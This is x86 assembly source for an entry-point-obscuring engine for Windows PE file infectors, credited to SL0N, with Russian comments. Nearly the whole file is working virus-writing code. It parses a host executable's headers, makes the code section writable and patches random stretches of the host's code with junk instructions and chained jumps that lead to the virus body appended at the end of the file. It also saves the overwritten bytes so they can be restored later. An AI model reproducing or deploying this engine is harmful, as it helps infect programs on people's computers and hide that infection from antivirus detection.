;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                       [SIMPLE EPO TECHNIQUE ENGINE  V. 0.1]                  ;
;                                                                              ;
;	    ###########    ###########    ############   ##############        ;
;	   #############  #############  ##############  ##############        ;
;	   ##             ###        ##  ###        ###       ###              ;
;	   ############   #############  ###        ###       ###              ;
;	    ############  ############   ###        ###       ###              ;
;	             ###  ###            ###        ###       ###              ;
;	   #############  ###            ##############       ###              ;
;	    ###########   ###             ############        ###              ;
;                                                                              ;
;                                 FOR MS WINDOWS                               ;
;                                                                              ;
;                                     BY SL0N                                  ;
;------------------------------------------------------------------------------;
;                                    MANUAL:                                   ;
; ADDRESS OF MAPPED FILE  -> EDX                               		       ;
;                                                                              ;
; CALL EPO                                                                     ;
;------------------------------------------------------------------------------;
;                               MANUAL FOR RESTORE:                            ;
; CALL RESTORE                                                                 ;
;                                                                              ;
; ENTRY POINT             -> EBX                                               ;
;------------------------------------------------------------------------------;
; (+) DO NOT USE WIN API                                                       ;
; (+) EASY TO USE                                                              ;
; (+) GENERATE GARBAGE INSTRUCTIONS (1,2,3,4,5,6 BYTES)                        ;
; (+) USE X87 INSTRUCTIONS                                                     ;
; (+) RANDOM NUMBER OF SPOTS                                                   ;
; (+) MUTABLE SPOTS                                                            ;
; (+) RANDOM LENGTH OF JUMP                                                    ;
;------------------------------------------------------------------------------;
epo:            
		push	esi edi                    ; Сохраняем в стэке esi 
		                                   ; и edi
		mov	[ebp+map_address],edx      ; Сохраняем адрес файла в
		                                   ; памяти
		call	get_head                   ; Получаем  PE заголовок
		                                   ;
		call	search_eip                 ; Вычисляем новую точку
		                                   ; входа
		call	find_code		   ; Ищем начало кода в этом 
						   ; файле
		call	spots			   ; Помещаем туда переход 
						   ; на вирус
		pop	edi esi                    ; Восстанавливаем из стэка
		                                   ; edi и esi
		ret				   ; Выходим из подпрограммы
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                      PE HEADER SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              FILE IN MEMORY -> EDX                            ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;

get_head:                                          
						   ; Подпрограмма получения
                                                   ; PE заголовка

		pusha                              ; Сохраняем всё в стэке

		mov 	ebx,[edx + 3ch]            ;
		add 	ebx,edx                    ;
		                                   ;
		mov 	[ebp + PE_header],ebx	   ; сохраняем PE заголовок
		mov 	esi,ebx                    ;
		mov	edi,esi                    ;
		mov 	ebx,[esi + 28h]            ;
		mov 	[ebp + old_eip],ebx	   ; Сохраняем старую точку
						   ; входа (eip)
		mov 	ebx,[esi + 34h]            ;
		mov 	[ebp + image_base],ebx	   ; Сохраняем
                                                   ; виртуальный адрес 
						   ; начала программы
                popa                               ; Вынимаем всё из стэка
		ret				   ; Выходим из подпрограммы
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                    NEW ENTRY POINT SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
search_eip:                                        
						   ; Подпрограмма вычисления
                                                   ; новой точки входа

		pusha                              ; Сохраняем всё в стэке

		mov	esi,[ebp+PE_header]        ; Кладём в esi указатель
		                                   ; На PE заголовок
		mov 	ebx,[esi + 74h]		   ; 	
		shl 	ebx,3			   ; 
		xor 	eax,eax			   ;
		mov 	ax,word ptr [esi + 6h]     ; Количество объектов
		dec 	eax			   ; (нам нужен последний-1
		mov 	ecx,28h			   ; заголовок секции)
		mul 	ecx			   ; * размер заголовка
		add 	esi,78h			   ; теперь esi указывает 
		add 	esi,ebx			   ; на начало последнего  
		add 	esi,eax			   ; заголовка секции

		mov	eax,[esi+0ch]              ; 
		add	eax,[esi+10h]              ; Сохраняем новую точку
		mov	[ebp+new_eip],eax          ; входа

                popa                               ; Вынимаем всё из стэка

		ret				   ; Выходим из подпрограммы
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                  FIND START OF CODE SUBROUTINE			       ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
find_code:                                         
						   ; Подпрограмма поиска начала
                                                   ; кода

		mov	esi,[ebp+PE_header]        ; Кладём в esi указатель
		                                   ; На PE заголовок

		mov 	ebx,[esi + 74h]		   ;
		shl 	ebx,3			   ; Получаем 
		xor 	eax,eax			   ; 
		mov 	ax,word ptr [esi + 6h]	   ; Количество объектов
find2:
		mov	esi,edi                    ;
		dec	eax                        ; 
		push	eax                        ; (нам нужен последний-1
		mov 	ecx,28h			   ; заголовок секции)
		mul 	ecx			   ; * размер заголовка
		add 	esi,78h			   ; теперь esi указывает на
		add 	esi,ebx			   ; начало последнего 
						   ; заголовка 
		add 	esi,eax			   ; секции
		mov	eax,[ebp+old_eip]	   ; В eax ложим точку входа
		mov	edx,[esi+0ch]		   ; В edx адрес куда будет
						   ; мапиться
						   ; текущая секция
		cmp	edx,eax			   ; Проверяем
		pop	eax			   ; Вынимаем из стэка eax
		jg	find2			   ; Если больше ищем дальше
		add	edx,[esi+08h]		   ; Добавляем виртуальный 
						   ; размер секци
		cmp	edx,[ebp+old_eip]	   ; Проверяем
		jl	find2			   ; Если меньше ищем дальше

		mov	edx,[esi+0ch]		   ; Далее вычисляем 
						   ; физическое
		mov	eax,[ebp+old_eip]	   ; смещение кода в файле
		sub	eax,edx			   ;
		add	eax,[esi+14h]	           ;
		add	eax,[ebp+map_address]	   ; И потом добавляем базу
						   ; памяти

		mov	[ebp+start_code],eax	   ; Сохраняем начало кода

                or 	[esi + 24h],00000020h or 20000000h or 80000000h 
						   ; Меняем аттрибуты 
						   ; кодовой секции

		mov	eax,[esi+08]               ; Вычисляем размер
		sub	eax,[ebp+old_eip]          ; той части кодовой секции,
		mov	edx,[esi+10h]              ; где можно размещать
		sub	edx,eax                    ; пятна
		mov	[ebp+size_for_spot],edx    ;

		ret				   ; Возврат из процедуры

;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                    SPOTS GENERATION SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
spots:                                             
						   ; Подпрограмма генерации
						   ; пятен

		mov	ecx,1                      ; Кладём в ecx единицу
		                                   ;
		call	reset                      ; Подготавливаем данные
		call	num_spots                  ; Генерируем случайное число
		                                   ; это будет кол-во пятен
tred:                                              
		call	save_bytes	           ; Сохраняем затираемы байты
		call	gen_spot                   ; Генерируем пятно

		inc	ecx                        ; Увеличиваем ecx на единицу
		cmp	ecx,[ebp+n_spots]          ; Все пятна сгенерированы
		jne	tred                       ; Если нет, то генерируем

		call	save_bytes		   ; Сохраняем последние байты
		call	gen_final_spot             ; И генерируем последнее
		                                   ; пятно
		ret				   ; Возврат из процедуры
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                    SPOT GENERATION SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
gen_spot:                                          
						   ; Подпрограмма генерации 
						   ; одного пятна

		push	eax ecx                    ; Сохраняем eax и ecx

		call	len_sp_jmp                 ; Получаем случайную длину
		xchg	eax,ebx                    ; прыжка пятна

		call	testing                    ; Проверяем, чтобы пятно
		jc	quit2                      ; не выходило за кодовую
                                                   ; секцию
		push	ebx
		xor	bx,bx
		dec	bx
		mov	ecx,[ebp+num1]             ; Генерируем первую партию
		call	garbage                    ; мусора
		pop	ebx

		mov	al,0e9h                    ; 
		stosb                              ;
		mov	eax,0                      ; Генерируем jmp
		add	eax,ebx                    ;
		add	eax,ecx                    ;
		stosd                              ;

		push	ebx
		xor	bx,bx
		dec	bx
		mov	ecx,[ebp+num2]             ; Генерируем вторую партию
		call	garbage                    ; мусора
		pop	ebx

		sub	edi,[ebp+num2]             ; 
		add	edi,[ebp+num1]             ; Корректируем edi
		add	edi,ebx                    ;
quit2:
		pop	ecx eax                    ; Восстанавливаем ecx и eax

		ret                                ; Возврат из подпрограммы
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                  LAST SPOT GENERATION SUBROUTINE		       ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
gen_final_spot:                                    
                                                   ; Подпрограмма генерации
						   ; финального пятна
 
		push	eax ecx                    ; Сохраняем eax и ecx
		                                   
		jc	not_big                    ; Если длина не превышает
		inc	[ebp+n_spots]              ; размера кодовой секции, то
not_big:                                           ; Увеличим кол-во пятен
		mov	ecx,[ebp+num1]             ; Генерируем мусорные
		call	garbage                    ; инструкции

		push	edi                        ; Сохраняем edi
		sub	edi,[ebp+start_code]       ; Подготавливаем длину jmp'a
		mov	ebx,edi                    ; для последнего пятна
		pop	edi                        ; Восстанавливаем edi

		mov	al,0e9h                    ;
		stosb                              ;
		mov	eax,0                      ;
		sub	eax,5                      ; Генерируем финальное
		sub	eax,ebx                    ; пятно
		add	eax,[ebp+new_eip]          ;
		sub	eax,[ebp+old_eip]          ;
		stosd                              ;

		mov	ecx,[ebp+num2]             ; Генерируем вторую партию
		call	garbage                    ; мусорных инструкций

		pop	ecx eax                    ; Восстанавливаем ecx и eax
		ret                                ; Возврат из подпрограммы
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                    SPOTS GENERATION SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;                        ADDRESS OF SAVING BYTES -> EDI                        ;
;                        QUANTITY OF BYTES       -> EBX		               ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;                            NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
save_bytes:
						   ; Подпрограмма сохранения
						   ; заменяемых байт

                pusha		                   ; Сохраняем всё в стэке
		call	length1                    ; Генерируем длины мусорных
		                                   ; инструкций
		mov	ebx,[ebp+num1]             ; Помещаем в ebx первую 
		add	ebx,[ebp+num2]             ; и вторую длины
		add	ebx,5                      ; Добавляем к ebx - 5

		mov	esi,edi                    ; Сохраняем в буфере с 
		mov	edi,[ebp+pointer]          ; начала смещение в памяти
		mov	eax,esi                    ; на сохраняемые байты
		stosd                              ;
		mov	ecx,ebx                    ; После этого сохраняем в
		mov	eax,ecx                    ; буфере кол-во сохраняемых
		stosd                              ; байт

		rep	movsb                      ; И в самом конце сохраняем
		mov	[ebp+pointer],edi          ; в буфере сами байты
		                                   ;
		popa                               ; Вынимаем всё из стэка
		ret                                ; Возврат из подпрограммы
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                       RESTORE SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      OLD ENTRY POINT -> EBX			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
restore:
						   ; Подпрограмма 
						   ; восстановления сохранённых
						   ; байт

		cld                                ; Поиск вперёд
		lea	esi,[ebp+rest_bytes]       ; В esi указазатель на буфер
		mov	edx,1                      ; В edx кладём - 1
not_enough:
		mov	edi,[ebp+old_eip]          ; В edi загружаем точку
		add	edi,[ebp+image_base]       ; входа
		mov	ebx,edi                    ; Сохраняем edi в ebx
		lodsd                              ; В eax старое смещение
		                                   ; байт в памяти
		sub	eax,[ebp+start_code]       ; Отнимаем смещение начала
		                                   ; кода и добавляем 
		add	edi,eax                    ; точку входа
		lodsd                              ; Загружаем в eax кол-во 
		mov	ecx,eax                    ; байт и кладём их в ecx
		rep	movsb                      ; Перемещаем оригинальные
		                                   ; байты на старое место
		inc	edx                        ; Переходим к следующему 
		cmp	edx,[ebp+n_spots]          ; пятну
		jl	not_enough                 ; если не все пятна вернули,
		                                   ; то восстанавливаем дальше
quit:                                              ;  
		ret				   ; Возврат из процедуры
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	               LENGTH SPOT GENERATION SUBROUTINE		       ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
length1:
						   ; Подпрограмма генерации
						   ; длин мусорных инструкций
		mov	eax,20                     ;
		call	brandom32                  ; Генерируем случайное число
		test	eax,eax                    ; в диапазоне 1..19
		jz	length1                    ;

		mov	[ebp+num1],eax             ; Сохраняем его в переменную
rand2:
		mov	eax,20                     ;
		call	brandom32                  ; Генерируем случайное число
		test	eax,eax                    ; в диапазоне 1..19
		jz	rand2                      ;

		mov	[ebp+num2],eax             ; Сохраняем его в вторую
		                                   ; переменную
		ret				   ; Возврат из процедуры
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                        RESET SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
reset:
						   ; Подпрограмма инициализации
						   ; переменных
		mov	edi,[ebp+start_code]       ;
		                                   ; 
		push	esi                        ; Инициализируем переменные
		lea	esi,[ebp+rest_bytes]       ;
		mov	[ebp+pointer],esi          ;
		pop	esi                        ;

		ret				   ; Возврат из процедуры
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	             SPOT JUMP LENGTH GENERATION SUBROUTINE		       ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			    LENGTH OF SPOT JUMP -> EAX			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
len_sp_jmp:
						   ; Подпрограмма генерации
						   ; длины прыжка

		mov	eax,150                    ;
		call	brandom32                  ; Генерируем случайное число
		cmp	eax,45                     ; в диапазоне 45..149
		jle	len_sp_jmp		   ;

 		ret				   ; Возврат из процедуры
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                SPOTS NUMBER GENERATION SUBROUTINE		       ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;			      NO OUTPUT IN SUBROUTINE			       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
num_spots:
						   ; Подпрограмма генерации
						   ; количества пятен

		pusha                              ; Сохраняем всё в стэке

		mov	eax,40                     ; Генерируем случайное число
		call	brandom32                  ; в диапазоне 1..40
		inc	eax                        ; И сохраняем его в
		mov	[ebp+n_spots],eax          ; переменной

		popa                               ; Вынимаем всё из стэка
		ret				   ; Возврат из процедуры
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;	                       TESTING SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          	              NO INPUT IN SUBROUTINE                           ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;                                                                              ;
;		                   CARRY FLAG			       	       ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
testing:
						   ; Подпрограмма проверки
						   ; попадения в границу секции

		push	edi eax                    ; Сохраняем edi eax в стэке

		add	edi,[ebp+num1]             ; Добавим к edi 1-ую длину
						   ; мусорных инструкций
		add	edi,[ebp+num2]             ; После этого добавим 2-ую
		add	edi,300                    ; И добавим число в которое
						   ; входит максимальный размер
						   ; пятна + длина его прыжка
		mov	eax,[ebp+size_for_spot]    ; В eax загрузим размер 
						   ; места для пятен и смещение
		add	eax,[ebp+start_code]       ; в памяти точки входа

		cmp	edi,eax                    ; Сравним eax и edi
		clc                                ; Сбросим carry флаг
		jl	m_space                    ; Если edi меньше, то все
		                                   ; хорошо
		mov	[ebp+n_spots],ecx          ; Если нет, то мы уменьшаем
		inc	[ebp+n_spots]              ; количество пятен и 
		stc                                ; устанавливаем carry флаг
m_space:
		pop	eax edi		           ; Вынимаем eax и edi 
		ret				   ; Возврат из процедуры
;------------------------------------------------------------------------------;
pointer		dd	0                          ;
n_spots		dd	0                          ;
                                                   ;
num1		dd	0                          ;
num2		dd	0                          ;
                                                   ; Данные необходимые для
PE_header	dd	0                          ; работы мотора
old_eip		dd	0                          ;
image_base	dd	0                          ;
start_code	dd	0                          ;
new_eip		dd	0                          ;
map_address	dd	0                          ;
size_for_spot	dd	0                          ;
rest_bytes:	db	2100 dup (?)               ;
;------------------------------------------------------------------------------;
